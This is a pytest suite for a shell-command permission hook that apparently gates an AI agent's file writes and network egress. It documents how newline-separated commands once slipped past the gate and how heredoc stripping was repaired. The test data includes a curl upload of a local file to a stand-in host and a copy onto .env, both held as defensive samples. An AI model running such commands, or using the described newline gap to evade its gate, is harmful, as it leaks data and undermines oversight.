"""Cycle R: a newline separator was invisible to the Bash write gate, and the reference
heredoc stripper it needed was itself defective.

`shlex.split` treats "\\n" as ordinary whitespace, so it never becomes a token and the
`"\\n"` member of the hook's `CONTROL` set matched nothing: a multi-line command was ONE
segment whose verb was the first line's. MEASURED through the hook's own extractor with
`WRIT_CWD=/proj` before the fix (do not re-derive; see plan.md ## Analysis):

    "ls\\ncp seed.txt src/x.py"                        -> set()                  INVISIBLE
    "ls ; cp seed.txt src/x.py"                        -> local /proj/src/x.py    control
    "ls\\necho y > src/x.py"                           -> local /proj/src/x.py    VISIBLE
    "ls\\ncurl -d @src/a.txt https://example.invalid"  -> set()                  INVISIBLE

A newline hid every VERB-DEPENDENT write and every egress row, and hid no redirect, because
the redirect loop never consults the verb. The BEFORE state is not prose here: mutation M1
turns the pre-split off and asserts exactly those four rows.

THE REFERENCE IMPLEMENTATION WAS DEFECTIVE TWICE, both EXECUTED on a verbatim copy of
writ-worktree-safety.sh's 1.7.0 helpers:

    doc ABOUT a write, with a REAL same-line redirect
      cat <<'EOF' > docs/notes.txt / old command: echo y > src/x.py / EOF
        today (no pre-split)   src/x.py True   docs/notes.txt True    n=11
        pre-split only         src/x.py True   docs/notes.txt True    n=13
        pre-split + stripper   src/x.py False  docs/notes.txt False   n=1

    interpreter fed by heredoc, REAL write in the body
      python3 - <<'EOF' / open('src/x.py',...) / EOF
        today (no pre-split)   src/x.py True                          DETECTED
        pre-split + stripper   src/x.py False                         coverage LOST

Those two cases are the point of the cycle and are first-class tests below.
"""
from __future__ import annotations

import uuid

import pytest

# autouse: pins cwd to a sandbox, this suite's standing convention.
from tests.fixtures.session_state import sandbox_cwd  # noqa: F401
from tests.test_bash_control_operator_split import (
    _extract_rows,
    MIRROR_FILES,
    _mirror_block,
    control_operators,
)
from tests.test_bash_egress_gate import _extract_egress
from tests.test_bash_group_construct_gate import _mutate, _mutated_extract
from tests.test_bash_wrapper_prefix_gate import _mutated_egress
from tests.test_bash_write_gate import (
    _extract,
    _extractor_src,
    _run_hook,
    _seed,
)

CWD, SRC = "/proj", "seed.txt"
TARGET, TARGET2, DOC = "src/x.py", "src/z.py", "docs/notes.txt"
EXPECTED_TARGET = ("local", CWD + "/" + TARGET)
EXPECTED_TARGET2 = ("local", CWD + "/" + TARGET2)
EXPECTED_DOC = ("local", CWD + "/" + DOC)
EGRESS_HOST = "example.invalid"
EGRESS_CMD = "curl -d @src/a.txt https://%s" % EGRESS_HOST

# The four measured rows, as commands.
NEWLINE_WRITE = "ls\ncp %s %s" % (SRC, TARGET)
SEMI_WRITE = "ls ; cp %s %s" % (SRC, TARGET)
NEWLINE_REDIRECT = "ls\necho y > %s" % TARGET
NEWLINE_EGRESS = "ls\n%s" % EGRESS_CMD

# The two EXECUTED heredoc cases.
DOC_ABOUT_A_WRITE = (
    "cat <<'EOF' > %s\n"
    "old command: echo y > %s\n"
    "EOF\n" % (DOC, TARGET)
)
HEREDOC_INTERPRETER = (
    "python3 - <<'EOF'\n"
    "open('%s','w')\n"
    "EOF\n" % TARGET
)
HEREDOC_INTERPRETER_NO_DASH = (
    "python3 <<'EOF'\n"
    "open('%s','w')\n"
    "EOF\n" % TARGET
)


def _mirror_ns(path: str) -> dict:
    ns: dict = {}
    exec(compile(_mirror_block(path), "<mirror:%s>" % path, "exec"), ns)
    return ns


# --------------------------------------------------------------------------- #
# 1. the four measured rows, AFTER
# --------------------------------------------------------------------------- #
class TestTheFourMeasuredRows:
    def test_a_verb_dependent_write_on_a_later_line_is_seen(self):
        assert _extract(NEWLINE_WRITE) == {EXPECTED_TARGET}, NEWLINE_WRITE

    def test_the_semicolon_control_is_unchanged(self):
        assert _extract(SEMI_WRITE) == {EXPECTED_TARGET}, SEMI_WRITE

    def test_a_redirect_on_a_later_line_is_still_seen(self):
        # Visible BEFORE the fix too, because a redirect needs no verb. Pinned so the
        # cycle cannot be read as having created it.
        assert _extract(NEWLINE_REDIRECT) == {EXPECTED_TARGET}, NEWLINE_REDIRECT

    def test_an_egress_verb_on_a_later_line_emits_its_host(self):
        rows = _extract_egress(NEWLINE_EGRESS)
        assert any(host == EGRESS_HOST for host, _detail in rows), rows

    def test_the_egress_command_alone_emits_no_write_row(self):
        # Exact equality: the newline split must not invent a target out of the
        # `@src/a.txt` payload argument.
        #
        # THE WRITE-ONLY HELPER ON PURPOSE. `_extract` splits each row on the FIRST tab
        # and keeps the remainder, so an egress row arrives as a 2-tuple whose second
        # field still carries a tab, and `== set()` would contradict the sibling test
        # four lines up that requires that very row to exist. `_extract_rows` keeps only
        # the 2-field write rows, which is the population this assertion is about.
        assert _extract_rows(NEWLINE_EGRESS) == set(), NEWLINE_EGRESS


# --------------------------------------------------------------------------- #
# 2. the two EXECUTED heredoc cases: the point of the cycle
# --------------------------------------------------------------------------- #
class TestADocumentAboutAWrite:
    def test_the_openers_own_destination_survives_and_the_body_phantom_does_not(self):
        # EXACT equality, both halves in one assertion: the real destination is kept and
        # the write named in the BODY yields no row. The verbatim reference stripper
        # loses BOTH (11 tokens to 1); no stripper at all keeps both, phantom included.
        assert _extract(DOC_ABOUT_A_WRITE) == {EXPECTED_DOC}, DOC_ABOUT_A_WRITE

    def test_a_real_command_after_the_terminator_is_still_seen(self):
        # Anti-vacuity, mirroring the worktree hook's own test at
        # tests/test_worktree_safety_extractor.py:188-199: a body-skipper that swallowed
        # the rest of the stream would make every assertion above pass by disabling the
        # gate.
        cmd = DOC_ABOUT_A_WRITE + "cp %s %s\n" % (SRC, TARGET2)
        assert _extract(cmd) == {EXPECTED_DOC, EXPECTED_TARGET2}, cmd


class TestAHeredocFedInterpreter:
    def test_a_write_in_the_body_is_still_detected(self):
        assert EXPECTED_TARGET in _extract(HEREDOC_INTERPRETER), HEREDOC_INTERPRETER

    def test_the_no_dash_spelling_is_detected_too(self):
        # The OPENER TOKEN is the only marker of this spelling (`inline_form` reads any
        # argument starting with `<` as the stdin form), so it survives body stripping.
        # The 1.7.0 stripper dropped the opener, which would have retired this spelling.
        assert EXPECTED_TARGET in _extract(HEREDOC_INTERPRETER_NO_DASH)

    def test_a_here_string_body_is_untouched_and_still_scanned(self):
        # `<<<` is a single-token VALUE, not a body, and the retired regex excluded it
        # with a lookahead the string-op rewrite has to keep.
        cmd = "python3 - <<< \"open('%s','w')\"" % TARGET
        assert EXPECTED_TARGET in _extract(cmd), cmd

    def test_a_glued_here_string_is_untouched_too(self):
        cmd = "python3 - <<<\"open('%s','w')\"" % TARGET
        assert EXPECTED_TARGET in _extract(cmd), cmd


# --------------------------------------------------------------------------- #
# 3. a newline that is DATA, not a separator
# --------------------------------------------------------------------------- #
class TestANewlineThatIsData:
    def test_a_newline_inside_a_quoted_string_is_not_a_separator(self):
        # Mirrors tests/test_worktree_safety_extractor.py:169-174. The naive
        # `cmd.split("\n")` would cut this argument into fragments, and `cp` would land
        # in command position.
        cmd = 'printf "%%s" "step one\ncp %s %s"' % (SRC, TARGET)
        assert _extract(cmd) == set(), cmd

    def test_a_backslash_continued_line_is_one_command(self):
        # The escape branch of split_commands. bash joins the lines, so the destination
        # on the continuation line is the real destination.
        cmd = "cp %s \\\n%s" % (SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd

    def test_a_quoted_heredoc_looking_string_opens_nothing(self):
        cmd = "grep -- \"<<'EOF'\" src/app.py"
        assert _extract(cmd) == set(), cmd


# --------------------------------------------------------------------------- #
# 4. boundary cases of the stripper itself
# --------------------------------------------------------------------------- #
class TestStripperBoundaries:
    def test_an_opener_with_no_newline_after_it_strips_nothing(self):
        # No body exists in this token stream, and consuming to the end would silence
        # the rest of the command.
        cmd = "cat <<'EOF' > %s" % DOC
        assert _extract(cmd) == {EXPECTED_DOC}, cmd

    def test_an_unterminated_heredoc_consumes_the_rest_as_body(self):
        # bash reads to EOF, so the remaining lines really ARE body, and a write named
        # in them is not a command being run.
        cmd = "cat <<'EOF' > %s\ncp %s %s\n" % (DOC, SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_DOC}, cmd

    def test_an_empty_body_still_leaves_the_following_command_visible(self):
        cmd = "cat <<'EOF' > %s\nEOF\ncp %s %s\n" % (DOC, SRC, TARGET)
        assert _extract(cmd) == {EXPECTED_DOC, EXPECTED_TARGET}, cmd

    @pytest.mark.parametrize("path", MIRROR_FILES)
    @pytest.mark.parametrize("tok,expected", [
        ("<<EOF", "EOF"),
        ("<<-EOF", "EOF"),
        ("<<'EOF'", "EOF"),
        ('<<"EOF"', "EOF"),
        ("<<-'EOF'", "EOF"),
        ("<<<", None),
        ("<<<EOF", None),
        ("<<''", None),
        ('<<""', None),
        ("<<", None),
        ("<<$X", None),
        ("<<'EOF'>f", None),
        ("<<EOF;", None),
        ("cat", None),
        ("", None),
    ])
    def test_the_opener_test_agrees_in_every_copy(self, path, tok, expected):
        # Per COPY, not once: the hooks reach the package through a sys.path insert and
        # fall back to the inline mirror, so a divergent copy is a divergent gate.
        assert _mirror_ns(path)["heredoc_terminator"](tok) == expected, (path, tok)

    @pytest.mark.parametrize("path", MIRROR_FILES)
    def test_the_same_line_tokens_survive_in_every_copy(self, path):
        ns = _mirror_ns(path)
        sep = ns["SEP"]
        toks = ["cat", "<<'EOF'", ">", DOC, sep, "echo", "y", ">", TARGET, sep, "EOF"]
        assert ns["strip_heredoc_bodies"](toks) == ["cat", "<<'EOF'", ">", DOC], path

    @pytest.mark.parametrize("path", MIRROR_FILES)
    def test_the_sep_sentinel_is_the_same_everywhere(self, path):
        assert _mirror_ns(path)["SEP"] == "\x00", path

    def test_the_hooks_control_set_carries_the_shared_sep_sentinel(self):
        # PIN THE CHAIN, not the producer: the hook spells the member as a LITERAL so its
        # CONTROL line stays ast.literal_eval-able, and this is what stops the literal and
        # the shared constant drifting apart.
        members = control_operators(_extractor_src()) | {"\x00"}
        assert "\x00" in members
        raw = _extractor_src()
        assert 'CONTROL = {"|", "||", "&&", ";", "&", "\\x00"}' in raw, (
            "the hook's CONTROL set no longer carries the SEP sentinel as a literal")


# --------------------------------------------------------------------------- #
# 5. the four must-keep-working constructs, re-asserted because this cycle
#    changes segment CONSTRUCTION
# --------------------------------------------------------------------------- #
class TestMustKeepWorkingConstructs:
    def test_arithmetic_is_still_not_a_group(self):
        assert _extract("(( total >> 2 ))") == set()
        assert _extract("echo $((3 > 2))") == set()

    def test_process_substitution_is_still_not_a_target(self):
        assert _extract("tee >(logger)") == set()
        assert _extract("echo x | tee >(cat); ls") == set()

    def test_bracket_and_test_are_still_the_verb(self):
        assert _extract('if [[ "$x" > "config.txt" ]]; then echo hi; fi') == set()
        assert _extract('if [ "$a" > .env ]; then :; fi') == set()

    def test_a_quoted_target_keeps_its_trailing_character(self):
        assert ("local", CWD + "/src/log.txt") in _extract('echo x > "src/log.txt"; ls')

    def test_a_heredoc_fed_tee_keeps_its_real_destination(self):
        # The surviving opener token cannot displace a destination on the one write arm
        # where a heredoc is a real spelling: the tee loop breaks at any argument
        # starting with `<` or `>`.
        cmd = "tee %s <<'EOF'\nsome text\nEOF\n" % TARGET
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd


# --------------------------------------------------------------------------- #
# 6. conditionality: four mutations, each with a specific witness
# --------------------------------------------------------------------------- #
class TestTheFixIsConditional:
    def test_removing_the_pre_split_reproduces_the_four_measured_rows(self):
        # M1. This IS the before-state, executed rather than quoted: the two INVISIBLE
        # rows go silent and the two that already worked stay green.
        src = _extractor_src()
        mutated = _mutate(src, "split_commands(cmd)", "cmd")
        assert mutated != src

        assert _mutated_extract(mutated, NEWLINE_WRITE) == set(), NEWLINE_WRITE
        assert not any(h == EGRESS_HOST
                       for h, _d in _mutated_egress(mutated, NEWLINE_EGRESS))
        assert EXPECTED_TARGET in _mutated_extract(mutated, NEWLINE_REDIRECT)
        assert EXPECTED_TARGET in _mutated_extract(mutated, SEMI_WRITE)

    def test_removing_the_same_line_boundary_reddens_only_the_openers_destination(self):
        # M2. The repair itself. The body-strip stays green (no phantom), which is what
        # makes this mutation specific to the boundary rather than to the stripper.
        # A TWO-PART MUTATION, and the reason is worth stating because the obvious
        # single-part ones both fail to say anything. Neutering the mirror block's
        # `out.append(toks[j])` alone is INERT: the package import rebinds
        # strip_heredoc_bodies over the mirrored copy, so the edited text never runs.
        # Dropping the stripper from the CALL is M3's mutation, not this one: measured,
        # it returns BOTH rows, because with no stripping at all the real destination
        # survives beside the phantom. The boundary's own effect is only observable when
        # the mirrored copy is what executes, so this mutation removes the name from the
        # package import AND neuters the block, which is what reproduces the 1.7.0
        # behavior: the opener's real destination lost along with the body.
        src = _extractor_src()
        mutated = _mutate(src, "out.append(toks[j])", "pass")
        mutated = _mutate(mutated, "split_commands, strip_group_opener, strip_heredoc_bodies,",
                          "split_commands, strip_group_opener,")
        assert mutated != src

        rows = _mutated_extract(mutated, DOC_ABOUT_A_WRITE)
        assert EXPECTED_DOC not in rows, rows
        assert EXPECTED_TARGET not in rows, rows

    def test_removing_the_stripper_brings_the_body_phantom_back(self):
        # M3. Proves the stripper is what removes the phantom, and that the stdin scan
        # does not depend on it.
        src = _extractor_src()
        mutated = _mutate(src, "strip_heredoc_bodies(raw_tokens)", "raw_tokens")
        assert mutated != src

        rows = _mutated_extract(mutated, DOC_ABOUT_A_WRITE)
        assert EXPECTED_TARGET in rows, rows
        assert EXPECTED_DOC in rows, rows
        assert EXPECTED_TARGET in _mutated_extract(mutated, HEREDOC_INTERPRETER)

    def test_scanning_the_stripped_stream_deletes_the_stdin_coverage(self):
        # M4. The EXECUTED regression a verbatim port would have shipped, as a test: feed
        # the stdin scan the STRIPPED list and the heredoc-fed write goes silent, while
        # the document case is untouched.
        src = _extractor_src()
        mutated = _mutate(src, "scan_tokens(split_control_operators(raw_tokens))",
                          "scan_tokens(tokens)")
        assert mutated != src

        assert EXPECTED_TARGET not in _mutated_extract(mutated, HEREDOC_INTERPRETER)
        assert _mutated_extract(mutated, DOC_ABOUT_A_WRITE) == {EXPECTED_DOC}


# --------------------------------------------------------------------------- #
# 7. through the REAL hook: the permissionDecision layer, which the extractor
#    rows cannot speak for
# --------------------------------------------------------------------------- #
class TestTheRealHookOnAMultiLineCommand:
    """Neither verdict was measured before this cycle. Both are server-independent: the
    credential deny and the egress ask both short-circuit ahead of the can-write round
    trip, so neither needs the session daemon. No credential file is created or read
    anywhere here; the classifier is path-only."""

    def _sid(self, **fields):
        sid = "bnl-%s" % uuid.uuid4().hex[:8]
        _seed(sid, **fields)
        return sid

    def test_a_credential_write_on_a_later_line_denies(self, tmp_path):
        # The seeded state is the one where it was ALLOWED, on purpose: a pre-approval
        # state would deny for the unrelated ENF-GATE-PLAN reason and prove nothing.
        # `cp` (verb-dependent) rather than a redirect, because a redirect was already
        # visible before this cycle.
        sid = self._sid(mode="work", gates_approved=["phase-a", "test-skeletons"],
                        current_phase="implementation")
        cmd = "ls\ncp %s .env" % SRC
        out = _run_hook(cmd, sid, str(tmp_path))
        assert out is not None, cmd
        assert out.get("permissionDecision") == "deny", (cmd, out)
        assert "SEC-CREDENTIAL-WRITE" in out.get("permissionDecisionReason", ""), out

    def test_an_egress_transfer_on_a_later_line_asks_and_names_the_host(self, tmp_path):
        # No write target in this command, so the verdict needs no gate state beyond a
        # mode: the egress ask is mode-independent.
        sid = self._sid(mode="conversation")
        out = _run_hook(NEWLINE_EGRESS, sid, str(tmp_path))
        assert out is not None
        assert out.get("permissionDecision") == "ask", out
        assert EGRESS_HOST in out.get("permissionDecisionReason", ""), out


# --------------------------------------------------------------------------- #
# 8. the disclosed residue, pinned with MEASURED values (see Verification V6)
# --------------------------------------------------------------------------- #
class TestTheResidueIsPinned:
    """Each shape degrades fail-closed, leaving an extra row rather than losing one. The
    expected sets below are the values V6 MEASURED; if a future change moves one, that is
    a behavior change to record, not a test to relax."""

    def test_a_terminator_word_mid_body_line_ends_the_strip_early(self):
        cmd = ("cat <<'EOF' > %s\n"
               "this EOF is not a terminator > %s\n"
               "EOF\n" % (DOC, TARGET))
        assert _extract(cmd) == {EXPECTED_DOC, EXPECTED_TARGET}, cmd

    def test_two_openers_on_one_command_honor_only_the_first_terminator(self):
        cmd = ("cat <<'A' <<'B' > %s\n"
               "first\n"
               "A\n"
               "cp %s %s\n"
               "B\n" % (DOC, SRC, TARGET))
        assert _extract(cmd) == {EXPECTED_DOC, EXPECTED_TARGET}, cmd

    def test_a_glued_opener_is_not_recognized(self):
        cmd = "cat <<'EOF'>%s\ncp %s %s\nEOF\n" % (DOC, SRC, TARGET)
        # MEASURED, one row, not two. The opener glued to its redirect is ONE shlex
        # token, so heredoc_terminator correctly declines it and nothing is stripped:
        # the body line becomes its own segment, which is the row below and is
        # fail-closed. The opener's own destination is NOT recovered, because REDIR
        # cannot match a token beginning with `<` and `>` is deliberately not a split
        # boundary. That is the `foo>bar` limit this hook's header rules out by name,
        # for the arithmetic counter, the process-substitution guard and `$(...)`.
        assert _extract(cmd) == {EXPECTED_TARGET}, cmd
